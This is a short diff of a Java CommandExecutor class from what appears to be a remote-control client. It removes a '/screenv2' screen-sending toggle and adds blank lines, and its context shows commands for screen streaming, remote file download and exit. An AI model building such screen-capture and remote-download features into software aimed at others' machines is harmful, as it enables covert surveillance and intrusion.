@@ -88,11 +88,6 @@ public class CommandExecutor {
 				Connection.sendMessage("[Screen]: Set to: " + screenEnabled);
 				return;
 			}
-			if (command.equalsIgnoreCase("/screenv2")) {
-				ScreenV2Sender.setEnabled(!ScreenV2Sender.isEnabled());
-				Connection.sendMessage("[ScreenV2]: Set to: " + ScreenV2Sender.isEnabled());
-				return;
-			}
 			if (command.equalsIgnoreCase("/stopapp")) {
 				Connection.sendMessage("[Client]: Bye!");
 				System.exit(0);
@@ -228,6 +223,7 @@ public class CommandExecutor {
 			if (isMultiCommand("/download", command)) {
 				String[] args = getCommandArgs(command);
 				Runnable DownloadRunnable = new Runnable() {
+
 					@Override
 					public void run() {
 						Connection.sendMessage("[Download]: Downloading " + args[2] + "...");
@@ -241,6 +237,7 @@ public class CommandExecutor {
 						}
 					}
 				};
+
 				Thread DownloadThread = new Thread(DownloadRunnable);
 				DownloadThread.start();
 				return;
